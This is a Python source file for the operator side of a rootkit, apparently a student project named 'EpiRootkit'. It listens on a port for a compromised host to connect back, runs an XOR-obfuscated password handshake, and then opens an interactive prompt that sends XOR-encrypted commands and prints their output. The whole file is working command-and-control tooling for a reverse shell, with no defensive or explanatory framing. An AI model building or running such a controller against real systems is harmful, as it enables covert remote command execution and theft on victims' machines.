import argparse
import socket
import logging
import sys
import time

XOR_KEY = 0x2A
EOF_MARKER = "--EOF--"


def xor_encrypt_decrypt(data: bytes) -> bytes:
    return bytes(b ^ XOR_KEY for b in data)


class EpiRootkitClient:
    def __init__(self, host: str, port: int, password: str, debug: bool = False):
        self.host = host
        self.port = port
        self.password = password
        log_level = logging.DEBUG if debug else logging.INFO
        logging.basicConfig(level=log_level, format='[%(levelname)s] %(message)s')
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server_socket.bind((self.host, self.port))
        except socket.error as e:
            logging.error(f"Failed to bind on {self.host}:{self.port} – {e}")
            sys.exit(1)
        self.server_socket.listen(1)
        logging.info(f"[*] Listening on {self.host}:{self.port} for incoming connections")

    def start(self):
        try:
            while True:
                conn, addr = self.server_socket.accept()
                logging.info(f"[+] Incoming connection from {addr[0]}:{addr[1]}")
                try:
                    authed = self._authenticate(conn)
                except Exception as e:
                    logging.error(f"Authentication error: {e}")
                    conn.close()
                    continue

                if not authed:
                    logging.warning("Authentication failed. Closing connection.")
                    conn.close()
                    continue

                logging.info("[+] Authentication successful")
                self._handle_session(conn)
        except KeyboardInterrupt:
            logging.info("Server shutting down.")
        finally:
            self.server_socket.close()

    def _authenticate(self, conn: socket.socket) -> bool:
        pw_bytes = self.password.encode('utf-8')
        encrypted_pw = xor_encrypt_decrypt(pw_bytes)
        conn.sendall(encrypted_pw)
        conn.settimeout(5.0)
        try:
            data = conn.recv(1024)
        except socket.timeout:
            logging.error("Authentication response timed out.")
            return False
        finally:
            conn.settimeout(None)

        if not data:
            logging.error("Rootkit closed connection during authentication.")
            return False

        response = xor_encrypt_decrypt(data).decode('utf-8', errors='ignore').strip()
        logging.debug(f"Received auth response: {response}")
        return response == "OK"

    def _handle_session(self, conn: socket.socket):
        while True:
            try:
                cmd = input("epirootkit> ")
            except EOFError:
                logging.info("Input stream closed. Ending session.")
                break

            if not cmd:
                continue

            if cmd in ("exit", "quit"):
                encrypted_cmd = xor_encrypt_decrypt(cmd.encode('utf-8'))
                conn.sendall(encrypted_cmd)
                logging.info("Sent exit command to rootkit. Closing session.")
                break

            encrypted_cmd = xor_encrypt_decrypt(cmd.encode('utf-8'))
            conn.sendall(encrypted_cmd)
            logging.debug(f"Sent command: {cmd}")

            output_buffer = ""
            start_time = time.strftime("%Y-%m-%d %H:%M:%S")
            while True:
                data = conn.recv(4096)
                if not data:
                    logging.warning("Connection lost while receiving command output.")
                    return

                chunk = xor_encrypt_decrypt(data)
                text_chunk = chunk.decode('utf-8', errors='ignore')

                if EOF_MARKER in text_chunk:
                    before_eof, _ = text_chunk.split(EOF_MARKER, 1)
                    output_buffer += before_eof
                    break
                else:
                    output_buffer += text_chunk

            if output_buffer:
                print(f"\n[{start_time}] Output:")
                print(output_buffer.strip())
            output_buffer = ""


def main():
    parser = argparse.ArgumentParser(description="EpiRootkit Client")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="Listening IP")
    parser.add_argument("--port", type=int, default=4242, help="Listening port")
    parser.add_argument("--password", type=str, default="secret", help="Authentication password")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    args = parser.parse_args()

    client = EpiRootkitClient(args.host, args.port, args.password, args.debug)
    client.start()


if __name__ == "__main__":
    main()
